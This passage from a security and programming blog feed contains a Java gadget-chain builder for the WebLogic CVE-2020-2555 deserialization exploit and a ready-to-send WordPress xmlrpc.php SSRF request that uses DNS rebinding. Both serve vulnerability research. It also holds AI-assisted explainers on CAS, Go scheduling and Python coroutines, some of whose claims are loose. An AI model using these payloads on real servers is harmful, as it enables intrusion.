limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_oAnchorTop&quot;</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> expException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ser(expException, <span class="string">&quot;./CVE_2020_2555_12013.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serName);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------序列化成功&quot;</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="CVE-2020-2555的修复">CVE-2020-2555的修复</h2>
<p>图片来自<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">ZDL</a>（侵删）可以看到是删了extractor.extract<br>
<img src="1585035027893-70b8222a-14ca-4001-84ce-471b16388b17.png" alt="image.png"></p>
<h2 id="总结">总结</h2>
<p>梳理完一遍之后，我们得以看到整个绕过思路的全貌。笔者主观分为三个阶段。</p>
<ul>
<li>第一阶段，CVE-2016-0638和CVE-2016-3510。利用反序列化流程中新new的原生ois绕过，只要找到了read*系列的点可以比较容易的看出来。</li>
<li>第二阶段，cve-2017-3248到cve-2018-3191。利用jrmp、jndi带外rce，漏洞点没有在read*的代码上下文中需要多跟几步有点“pop”的感觉了。</li>
<li>第三阶段，cve-2020-2555，需要对java的反序列化出现过知识点很熟悉（java原生类的触发点+weblogic组件中类似cc的套路），据说这个漏洞的作者也挖了很久。</li>
</ul>
<p><strong>碍于笔者水平，行文出错在所难免，如有阅读此文的师傅发现错误还请不吝指正。</strong></p>
<h2 id="参考">参考</h2>
<p><a href="https://www.anquanke.com/post/id/162782">从WebLogic看反序列化漏洞的利用与防御</a><br>
<a href="https://www.jianshu.com/p/411e18ceaa55">Java 序列化之 Externalizable</a><br>
<a href="https://seaii-blog.com/index.php/2019/12/29/92.html">Weblogic漏洞调试笔记</a><br>
<a href="https://wooyun.js.org/drops/%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E5%BC%80%E6%94%BEHTTPS%E6%9C%8D%E5%8A%A1%E7%9A%84weblogic%E6%9C%8D%E5%8A%A1%E5%99%A8.html">如何控制开放HTTPS服务的weblogic服务器</a><br>
<a href="https://y4er.com/post/weblogic-cve-2016-0638/">Weblogic CVE-2016-0638 StreamMessageImpl反序列化绕过分析</a><br>
<a href="https://www.databaseusers.com/article/6108629/Patch+S8C2+is+mutually+exclusive+and+cannot+coexist+with+patch(es)%3A+ZLNA%2CEJUW">Patch S8C2 is mutually exclusive and cannot coexist with patch(es): ZLNA,EJUW</a><br>
<a href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a><br>
<a href="https://www.anquanke.com/post/id/152164">CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警</a><br>
<a href="https://nosec.org/home/detail/4314.html">漫谈 Weblogic CVE-2020-2555</a><br>
<a href="https://paper.seebug.org/1141/">Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>wordpress xmlrpc.php have ssrf vuln(use dns rebinding bypass limit)</title>
    <url>/2019/11/01/wordpress%20xmlrpc.php%20have%20ssrf%20vuln(use%20dns%20rebinding%20bypass%20limit)/</url>
    <content><![CDATA[<!-- In the wordpress xmlrpc.php pingback_ping function, the domain which be passed in was parsed three times. -->
<!-- more -->
<p>The first is in <code>wp-includes/class-wp-xmlrpc-server.php:6774</code>to<code>wp-includes/http.php:551</code>. When the incoming url is a domain name, dns parsing will be performed and determine whether ip belongs to the intranet ip.<br>
<img src="./1572267029097.png" alt="Alt text"><br>
<img src="./1572265889994.png" alt="Alt text"></p>
<p>The second is <code>wp-includes/class-http.php:265</code>. The code in <code>wp_http_validate_url</code> is the same as the one in the first screenshot.</p>
<p><img src="./1572266403614.png" alt="Alt text"></p>
<p>The last is in <code>wp-includes/Requests/Transport/cURL.php:162</code><br>
<img src="./1572266653537.png" alt="Alt text"></p>
<p>So if I provide a domain name which has very short ttl, let the first and second time be resolved to an external network address. Let the third time be resolved into an intranet address。</p>
<p>The details of the payload are as follows</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wordpress/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 338</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://ffffffff.2FF02E9A.rbndr.us:443/xmlrpc.php?hack=ssrf&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://127.0.0.1:8888/wordpress/2019/10/27/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
<p>ffffffff is the hexadecimal form of the intranet ip 127.0.0.1 and 2FF02E9A is the hexadecimal form of the external network ip。</p>
<p>When dns parsing <a href="http://ffffffff.2FF02E9A.rbndr.us">ffffffff.2FF02E9A.rbndr.us</a>, the server will randomly return 127.0.0.1 or the external network ip<br>
<img src="./1572265098087.png" alt="Alt text"></p>
<p>Here I have been replaying this package for the convenience of testing. I hope that the dns parsing result of the request is just the external network address, the external network address, and the internal network address.(Need good luck， i I tried thousands of times)<br>
However, in the actual situation, it is entirely possible to build a dns server to accurately return the sequence of the external network address, the external network address, and the internal network address（I am too lazy =.=）.</p>
<p>nc -lp 443<br>
<img src="./1572612651416.png" alt="Alt text"></p>
<p><img src="./1572612727295.png" alt="Alt text"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>与AI纸上谈兵-CAS的ABA问题</title>
    <url>/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1>CAS</h1>
<blockquote>
<p><code>CAS</code>即<code>Compare And Swap</code>的缩写，翻译成中文就是 <strong>比较并交换</strong> ，其作用是让CPU比较内存中某个值是否和预期的值相同，如果相同则将这个值更新为新值，不相同则不做更新，也就是CAS是<strong>原子性</strong>的操作(读和写两者同时具有原子性)，其实现方式是通过借助<code>C/C++</code>调用CPU指令完成的，所以效率很高。</p>
</blockquote>
<h1>用CAS来实现一个无锁栈</h1>
<p>设想我们实现了一个无锁栈，用链表节点表示栈中的元素，其中<code>top</code>指针指向栈顶元素。为了实现高效和线程安全的出栈操作，我们使用CAS更新<code>top</code>指针。一个典型的出栈伪代码可能是以下形式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pop</span>(<span class="params"></span>) &#123;  </span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        oldTop = top  <span class="comment">// 获取当前栈顶节点  </span></span><br><span class="line">        <span class="keyword">if</span> (oldTop == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>  <span class="comment">// 栈为空  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        newTop = oldTop.<span class="property">next</span>  <span class="comment">// 栈顶将被移除，新的栈顶是下一个  </span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!<span class="title function_">compare_and_swap</span>(top, oldTop, newTop))  <span class="comment">// CAS操作，尝试更新栈顶  </span></span><br><span class="line">    <span class="keyword">return</span> oldTop.<span class="property">value</span>  <span class="comment">// 返回栈顶的值  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>ABA问题-在无锁栈中</h1>
<p>假设以下线程和操作按顺序发生：</p>
<ol>
<li>线程A：调用<code>pop</code>，读取<code>oldTop</code>，其值是节点A。</li>
<li>线程B：调用两次<code>pop</code>，依次移除了节点A和节点B，并随后将节点A重新压回栈（通过<code>push</code>操作），此时栈的<code>top</code>再次指向节点A。</li>
<li>线程A：继续执行刚才的CAS操作，发现<code>top</code>的值仍然是节点A（因为线程B又将节点A压回栈），CAS 操作通过。</li>
</ol>
<p>看似 CAS 成功了，但线程A并不知道，栈的结构已经在它检查<code>oldTop</code>和执行CAS之间发生了改变。此时<strong>返回的节点A</strong>可能已经不再安全使用，因为它的状态已经被修改，或者栈本身的数据结构可能已经遭到破坏。</p>
<h1>ABA问题-在“生活”中</h1>
<p>小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50</p>
<p>线程1（提款机）：获取当前值100，期望更新为50，</p>
<p>线程2（提款机）：获取当前值100，期望更新为50，</p>
<p>线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50</p>
<p>线程3（默认）：获取当前值50，期望更新为100，</p>
<p>这时候线程3成功执行，余额变为100，</p>
<p>线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50！！！</p>
<p>此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。</p>
<h1>ABA问题的解决</h1>
<p>在变量前面加上版本号，每次变量更新的时候变量的 <strong>版本号都</strong> <code>+1</code>，即<code>A-&gt;B-&gt;A</code>就变成了<code>1A-&gt;2B-&gt;3A</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;  </span><br><span class="line">    T value;  </span><br><span class="line">    Node&lt;T&gt; next;  </span><br><span class="line">    <span class="type">long</span> version; <span class="comment">// 添加版本号字段  </span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VersionedReference</span>&lt;T&gt; &#123;  </span><br><span class="line">    Node&lt;T&gt; reference;  </span><br><span class="line">    <span class="type">long</span> version;  </span><br><span class="line">  </span><br><span class="line">    VersionedReference(Node&lt;T&gt; ref, <span class="type">long</span> ver) &#123;  </span><br><span class="line">        reference = ref;  </span><br><span class="line">        version = ver;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">function <span class="title function_">pop</span><span class="params">()</span> &#123;  </span><br><span class="line">    VersionedReference&lt;T&gt; oldTop;  </span><br><span class="line">    Node&lt;T&gt; newTop;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        oldTop = top.get(); <span class="comment">// 获取当前的引用和版本号  </span></span><br><span class="line">        <span class="keyword">if</span> (oldTop.reference == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 栈为空  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        newTop = oldTop.reference.next; <span class="comment">// 新的栈顶是下一个节点  </span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">// CAS操作会同时比较引用和版本号  </span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!top.compareAndSet(  </span><br><span class="line">        oldTop,  <span class="comment">// 期望的旧值(包含引用和版本号)  </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VersionedReference</span>(newTop, oldTop.version + <span class="number">1</span>)  <span class="comment">// 新值(更新引用和版本号)  </span></span><br><span class="line">    ));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> oldTop.reference.value;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h1>什么是原语？</h1>
<blockquote>
<p>计算机是一门人造科学，因此真正意义上的“原语”是不存在的。操作系统层面上的“原语”（比如 write 之类的系统调用）对程序员来讲的确是不可分割的最小单位，但是这写系统调用本身还是用好几句汇编语句组成的（对于 Linux 来说是 C 语言）。可能有人要说到了机器代码这一级就不能再分了，但事实上一条机器指令也是由好几个组合逻辑信号构成的。同样的道理，控制信号也不过是无数电子在器件内部漂移的结果。</p>
<p>因此定义“原语”的前提是观察者所处的位置。一旦规定了观察者的位置和观察的角度，比如就在操作系统的这层上，read，wirte，wait这些个系统调用自然就是最“原始”的词汇，这也是为什么“原语”会在操作系统中频繁出现的缘故。</p>
</blockquote>
<h1>参考</h1>
<p><a href="https://www.cnblogs.com/hualalasummer/p/3704225.html">什么是“原语”</a></p>
<p><a href="https://juejin.cn/post/6844903796129136647">CAS原理分析及ABA问题详解</a></p>
<p>Claude 3.5 sonnet</p>
]]></content>
      <tags>
        <tag>talking big</tag>
      </tags>
  </entry>
  <entry>
    <title>与AI纸上谈兵-Go中I/O密集型需要设置P超过CPU核心数吗？</title>
    <url>/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Go%E4%B8%ADI-O%E5%AF%86%E9%9B%86%E5%9E%8B%E9%9C%80%E8%A6%81%E8%AE%BE%E7%BD%AEP%E8%B6%85%E8%BF%87CPU%E6%A0%B8%E5%BF%83%E6%95%B0%E5%90%97%EF%BC%9F/</url>
    <content><![CDATA[<h1>GO的GMP</h1>
<p>在 Go 语言中，GMP 是 Go 运行时调度器的核心模型，用于高效地管理并发任务（goroutine）的执行。GMP 分别代表：</p>
<ul>
<li>G（Goroutine）：Go 中的轻量级线程，表示一个独立的任务或协程。</li>
<li>M（Machine）：操作系统线程，Go 运行时通过 M 来执行 G。</li>
<li>P（Processor）：逻辑处理器，负责调度 G 到 M 上运行。</li>
</ul>
<p>GMP 模型的设计目的是为了高效利用多核 CPU，同时隐藏底层线程管理的复杂性，提供更高效的并发支持。</p>
<hr>
<h3 id="GMP-模型的具体含义">GMP 模型的具体含义</h3>
<ol>
<li>
<p>G（Goroutine）</p>
<ol>
<li>Goroutine 是 Go 的核心并发单元，类似于协程。</li>
<li>每个 G 包含任务的执行上下文（如栈、程序计数器等）和调度信息。</li>
<li>G 是非常轻量级的，创建和销毁的开销远小于操作系统线程。</li>
</ol>
</li>
<li>
<p>M（Machine）</p>
<ol>
<li>M 是操作系统线程的抽象，负责执行 G。</li>
<li>M 直接与操作系统线程绑定，Go 运行时会动态创建或销毁 M，以适应程序的并发需求。</li>
<li>一个 M 在任意时刻只能绑定一个 P，且只能执行绑定的 P 中的 G。</li>
</ol>
</li>
<li>
<p>P（Processor）</p>
<ol>
<li>P 是逻辑处理器，负责调度 G 到 M 上运行。</li>
<li>P 的数量由 <code>GOMAXPROCS</code> 决定，表示程序可以并行运行的最大线程数。</li>
<li>P 维护一个本地的 G 队列，存储待执行的 Goroutine。</li>
<li>如果 P 的 G 队列为空，它可以从其他 P 的队列中窃取任务（work stealing）。</li>
</ol>
</li>
</ol>
<hr>
<h3 id="GMP-的工作流程">GMP 的工作流程</h3>
<ol>
<li>
<p>G 的创建</p>
<ol>
<li>当程序创建一个新的 Goroutine 时，G 会被放入某个 P 的本地队列中，等待被调度执行。</li>
</ol>
</li>
<li>
<p>P 调度 G</p>
<ol>
<li>P 从自己的本地队列中取出 G，并将其分配给绑定的 M 执行。</li>
<li>如果本地队列为空，P 会尝试从其他 P 的队列中窃取任务。</li>
</ol>
</li>
<li>
<p>M 执行 G</p>
<ol>
<li>M 负责实际执行 G 的代码。</li>
<li>如果 G 阻塞（如 I/O 操作），M 会将当前 G 挂起，并尝试执行其他 G。</li>
</ol>
</li>
<li>
<p>动态调整</p>
<ol>
<li>如果 G 的数量远超 M 的数量，Go 运行时会动态创建新的 M。</li>
<li>如果某些 M 长时间空闲，Go 运行时会销毁这些 M，以节省资源。</li>
</ol>
</li>
</ol>
<hr>
<h3 id="GMP-模型的优点">GMP 模型的优点</h3>
<ol>
<li>
<p>高效的并发支持</p>
<ol>
<li>Goroutine 是轻量级的，创建和切换的开销远小于操作系统线程。</li>
<li>GMP 模型通过逻辑处理器（P）和任务窃取机制，充分利用多核 CPU 的性能。</li>
</ol>
</li>
<li>
<p>自动调度</p>
<ol>
<li>Go 运行时自动管理 Goroutine 的调度，开发者无需手动管理线程。</li>
</ol>
</li>
<li>
<p>阻塞操作优化</p>
<ol>
<li>当 Goroutine 阻塞时，Go 运行时会将其挂起，并调度其他 Goroutine 执行，避免线程资源浪费。</li>
</ol>
</li>
</ol>
<h1>In the Go GMP model, does an IO-intensive application need to set the number of P greater than the number of CPU cores?</h1>
<p>No, an I/O-intensive application in Go’s GMP (Goroutine, Machine, Processor) model generally <em>does not</em> need to set <code>GOMAXPROCS</code> (the number of P’s) greater than the number of CPU cores. In fact, doing so can often be detrimental to performance. Here’s why:</p>
<ul>
<li><strong>Concurrency vs. Parallelism:</strong> Go’s strength lies in concurrency, not necessarily parallelism. Concurrency means handling multiple tasks at the same time, while parallelism means executing multiple tasks simultaneously. I/O-bound operations spend most of their time waiting for external resources (disk, network, etc.). During this waiting time, the OS puts the goroutine to sleep. Another goroutine can then run on the same OS thread (and thus, the same P). Increasing the number of P’s won’t make the I/O faster; it just adds overhead for context switching between P’s.</li>
<li><strong>OS Thread Management:</strong> The P’s are mapped to OS threads. Having more P’s than CPU cores means the OS scheduler will be constantly switching between threads, leading to context switching overhead.() This overhead can outweigh any potential gains, especially in I/O-bound applications where the CPU is not the bottleneck.</li>
<li><strong>Blocking System Calls:</strong> When a goroutine makes a blocking system call (like reading from a file or network socket), the associated OS thread is blocked. However, the Go runtime uses a technique called “network poller” to handle network I/O efficiently. For file I/O, if the runtime detects a long blocking operation, it can detach the M (OS thread) from the P, allowing other goroutines to run on that P. When the I/O operation completes, the M is reattached. This mechanism minimizes blocking and context switching.</li>
</ul>
<h1>I/O时会发生什么？</h1>
<p><strong>网络 I/O：</strong> Go runtime 使用非阻塞的 I/O 模型和 epoll/kqueue 等操作系统提供的 I/O 多路复用机制（network poller）。当一个 G 发起网络 I/O 操作时，通常不会阻塞 M。而是将 I/O 请求交给操作系统，然后该 G 会被放入网络轮询器(network poller)中等待 I/O 事件。P 可以继续调度其他 G 在 M 上执行。当 I/O 事件发生时，runtime 会收到通知，并将相应的 G 重新放回 P 的 runqueue 中，等待调度。</p>
<p><strong>文件 I/O (以及其他可能长时间阻塞的系统调用)：</strong> 对于文件 I/O，如果操作是阻塞的（例如读取大文件），则情况会略有不同。在这种情况下：</p>
<ul>
<li>如果 runtime 判定此 I/O 操作会长时间阻塞，会将  <strong>M 从 P 上解绑</strong> 。这个过程叫做 <code>sysmon</code> 会检测，当一个 M 阻塞时间过长，sysmon会把这个M和P分离。</li>
<li>此时，P 就变成空闲状态了，它可以寻找其他的 M 来绑定，或者创建新的 M。这样，其他的 G 就有机会在这个 P 上继续执行，不会因为某个 G 的文件 I/O 操作而导致整个 P 阻塞。</li>
<li>当 I/O 操作完成时，被解绑的 M 会尝试重新获取一个 P。如果此时有空闲的 P，则直接绑定；如果没有空闲的 P，则 M 会进入一个空闲 M 列表等待 P。</li>
</ul>
<h1>更多<strong>解绑细节</strong></h1>
<p>当 <code>sysmon</code> 将 M 和 P 解绑后，P 不会立即创建新的 M。P 的行为如下：</p>
<ol>
<li><strong>检查本地 runqueue：</strong> P 首先会检查其本地的 runqueue (runq) 中是否还有待执行的 G。如果 runqueue 不为空，P 会选择一个 G，并尝试找到一个 <em>空闲的 M</em> 来执行该 G。</li>
<li><strong>寻找空闲 M：</strong> P 会首先查看是否有空闲的 M 列表 (idle M list)。如果存在空闲的 M，P 会直接与该 M 绑定，然后将 runqueue 中的 G 调度到该 M 上执行。</li>
<li><strong>创建新的 M（如果需要）：</strong> 如果没有空闲的 M 可用，且 P 的 runqueue 不为空，P <em>才会</em> 创建一个新的 M，并与该 M 绑定，然后将 runqueue 中的 G 调度到该 M 上执行。</li>
<li><strong>窃取 (work stealing)：</strong> 如果 P 的 runqueue 也为空，P 会尝试从其他 P 的 runqueue 中 <em>窃取</em> 一部分 G。这是 Go 调度器实现负载均衡的重要机制。如果窃取成功，P 就会有待执行的 G，并按照上述步骤寻找或创建 M 来执行。</li>
<li><strong>进入休眠 (spinning)：</strong> 如果 P 的 runqueue 为空，且无法从其他 P 窃取到 G，P 会进入休眠状态 (spinning)。此时 P 不会消耗 CPU 资源，直到有新的 G 需要执行时才会被唤醒。</li>
</ol>
<h1>还有一个细节</h1>
<p>sysmon是发现它是文件i/o所以分离M和P。还是因为他syscall时间太长所以分离。注意这两个的区别，一个是提前就发现了，一个是超时了才发现。</p>
<ol>
<li><strong>不是提前发现是文件 I/O</strong></li>
</ol>
<p>Go runtime 并不会在 G 执行系统调用 <em>之前</em> 就判断这是不是文件 I/O，然后采取特殊处理。实际上，runtime 对所有类型的阻塞系统调用都采用相同的处理方式，包括文件 I/O、网络 I/O（在某些情况下，虽然通常是异步的，但也可能发生阻塞）、以及其他用户自定义的阻塞系统调用。</p>
<p>这意味着：</p>
<ul>
<li>runtime 没有维护一个“文件 I/O 特殊处理”的列表或逻辑。</li>
<li>runtime 不会区分系统调用的类型。</li>
</ul>
<ol start="2">
<li><strong>是 syscall 时间太长才分离</strong></li>
</ol>
<p><code>sysmon</code> 的核心工作是  <em>监控</em> ，而不是  <em>预判</em> 。它通过周期性地检查所有 M 的状态来判断是否有 M 阻塞在系统调用上的时间过长。这个“过长”的阈值通常是 10ms。</p>
<p>具体流程如下：</p>
<ol>
<li>G 执行一个系统调用。</li>
<li>runtime 将该 G 的状态标记为 <code>_Gsyscall</code>。</li>
<li>该 G 所在的 M 进入阻塞状态，等待系统调用完成。</li>
<li><code>sysmon</code> 周期性地检查所有 M 的状态。</li>
<li>如果 <code>sysmon</code> 发现某个 M 的状态为 <code>_Gsyscall</code>，并且持续时间超过阈值（10ms），它就认为该 M 正在执行长时间阻塞的系统调用。</li>
<li><code>sysmon</code> 将该 M 与其绑定的 P 解绑。</li>
</ol>
<p>因此，分离 M 和 P 的  <em>根本原因是超时</em> ，而不是提前知道是哪种类型的系统调用。</p>
<h1>参考</h1>
<p>Google Gemini2.0</p>
]]></content>
      <tags>
        <tag>talking big</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>与AI纸上谈兵-Python协程的原理与I/O多路复用</title>
    <url>/2024/08/21/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Python%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8EI-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</url>
    <content><![CDATA[<p>推荐一个prompt的网站 <a href="https://snackprompt.com/">https://snackprompt.com/</a> ，下面会用这里面的prompt以获取更结构化的答案。</p>
<!-- more -->
<h2 id="python协程程能做到高并发的底层原理">python协程程能做到高并发的底层原理</h2>
<p>使用<a href="https://snackprompt.com/prompt/get-chatgpt4-to-efficiently-teach-you-difficult-advanced-technical-concepts">Get ChatGPT4 to efficiently teach you difficult / advanced technical concepts</a> 这个prompt</p>
<p>Python’s concurrency, particularly through coroutines, is a powerful feature that allows high concurrency with minimal overhead. Here’s a breakdown of the underlying principles:</p>
<ol>
<li>
<p>Understanding Coroutines:</p>
<ol>
<li>Coroutines are generalizations of subroutines. Unlike subroutines, coroutines can pause execution and return control to the caller, enabling tasks to be executed concurrently.</li>
<li>This is aided by the <code>asyncio</code> library in Python, which provides a framework for writing single-threaded concurrent code using coroutines.</li>
</ol>
</li>
<li>
<p>Event Loop:</p>
<ol>
<li>At the heart of coroutine-based concurrency is the event loop. The event loop runs the registered tasks (coroutines) in an organized manner. It uses I/O multiplexing to manage tasks without the need for multiple threads or processes.</li>
</ol>
</li>
<li>
<p>Non-blocking I/O Operations:</p>
<ol>
<li>Coroutines efficiently manage I/O-bound and high-level structured network code through non-blocking operations. When a coroutine performs an I/O operation, other tasks can run. When the operation completes, the routine is resumed.</li>
</ol>
</li>
<li>
<p>Task Scheduling:</p>
<ol>
<li>Instead of creating a new thread for each task, the event loop schedules multiple tasks to run on the same thread. This lightweight task management means less overhead compared to threads and processes.</li>
</ol>
</li>
<li>
<p>Yielding Control:</p>
<ol>
<li><code>await</code> expressions in coroutines are used to yield control back to the event loop, allowing other tasks to run. This cooperative multitasking reduces the complexity of managing context switches, unlike preemptive multitasking.</li>
</ol>
</li>
<li>
<p>Memory Efficiency:</p>
<ol>
<li>Coroutines are much more memory efficient compared to threads because they do not require their own stack. They work in the same address space, avoiding the need for context switching that is typical of thread-based concurrency.</li>
</ol>
</li>
<li>
<p>Concurrency Patterns:</p>
<ol>
<li>Advanced patterns like producer-consumer, pipelines, and fan-out/fan-in can be implemented using coroutines to effectively handle high concurrency scenarios with low latency.</li>
</ol>
</li>
</ol>
<p>Understanding these principles helps you leverage Python’s concurrency through coroutines to achieve high throughput in applications with limited resources.</p>
<h2 id="追问-I-O不被操作系统挂起的原因">追问 I/O不被操作系统挂起的原因</h2>
<blockquote>
<p>“When a coroutine performs an I/O operation, other tasks can run. When the operation completes, the coroutine is resumed.”</p>
<p>假设这个包含协程的线程是A，其它线程比如一个UI的线程是B</p>
<p>它是怎么做到检测一个task在I/O然后切换到另一个task的，对于操作系统来说（比如linux）尽管它有很多task但是对于kernel来说就是只有一个线程。也就是说一个task在I/O的时候，内核会认为这个线程有I/O。这时候内核难道不是应该把这个包含协程的线程A挂起，切换其它的线程比如B进来执行吗？为什么会让这个协程继续执行后其他的task？</p>
</blockquote>
<p>在Python的协程模型中，特别是使用<code>asyncio</code>库时，协程的执行并不依赖于操作系统的线程调度。相反，它依赖于一个事件循环（event loop）来管理和调度任务。这意味着即使在单线程环境下，也可以通过协程实现并发。</p>
<h3 id="事件循环和非阻塞I-O">事件循环和非阻塞I/O</h3>
<ol>
<li>事件循环：事件循环是协程并发的核心。它负责调度和执行协程任务。当一个协程遇到<code>await</code>表达式（通常是一个I/O操作）时，它会将控制权返回给事件循环，而不是阻塞线程。</li>
<li>非阻塞I/O：协程中的I/O操作是非阻塞的。这意味着，当一个协程等待I/O操作完成时，它不会阻塞整个线程。相反，事件循环会继续运行其他已准备好的协程。</li>
</ol>
<h3 id="内核和线程的交互">内核和线程的交互</h3>
<p><strong>在操作系统层面（例如Linux），线程在执行I/O操作时会被标记为“可阻塞”状态。然而，Python的</strong>**<code>asyncio</code><strong><strong>库通过使用非阻塞I/O（例如，使用</strong></strong><code>select</code><strong><strong>、</strong></strong><code>poll</code><strong><strong>或</strong></strong><code>epoll</code>**<strong>等系统调用）来避免线程被阻塞。</strong></p>
<ul>
<li>当协程执行一个非阻塞I/O操作时，事件循环会注册这个操作，并继续执行其他任务。</li>
<li>一旦I/O操作完成，事件循环会收到通知，并恢复被挂起的协程。</li>
</ul>
<h3 id="协程与线程的区别">协程与线程的区别</h3>
<ul>
<li>协程：在用户级别管理，依赖于事件循环进行调度。它们共享同一个线程，不需要操作系统的上下文切换，因此开销较小。</li>
<li>线程：由操作系统管理，涉及到内核级别的调度和上下文切换，开销较大。</li>
</ul>
<h3 id="线程A和线程B的关系">线程A和线程B的关系</h3>
<p>在你的例子中，线程A运行事件循环并调度协程任务，线程B可能运行其他任务（例如UI）。如果线程A中的协程在等待I/O，事件循环会继续调度其他协程，而不会被操作系统挂起。只有当线程A没有其他协程可以运行时，操作系统才可能将线程A挂起并调度其他线程（例如线程B）。</p>
<p>因此，通过这种方式，Python的协程能够在单线程环境中实现高效的并发，而不需要依赖多线程机制。</p>
<h2 id="追问-select-poll-epoll的原理">追问 select, poll, epoll的原理</h2>
<p>使用 <a href="https://snackprompt.com/prompt/compscigpt-computer-science-assistant">CompSciGPT computer science assistant</a> 这个prompt</p>
<p>In the realm of operating systems and network programming, handling multiple simultaneous I/O operations is crucial. This is where system calls like <code>select</code>, <code>poll</code>, and <code>epoll</code> come into play, particularly in environments like server development. Let’s explore the differences and use cases for each:</p>
<h3 id="Select">Select</h3>
<ul>
<li>
<p>Overview: <code>select</code> is one of the oldest I/O multiplexing options available in Unix-based systems.</p>
</li>
<li>
<p>Functionality: It allows a program to monitor multiple file descriptors to see if any of them is ready for I/O (e.g., ready to read, write, or has an exceptional condition pending).</p>
</li>
<li>
<p>Limitations:</p>
<ul>
<li>Scalability: It supports a limited number of file descriptors, typically 1024, though this is configurable in some systems.</li>
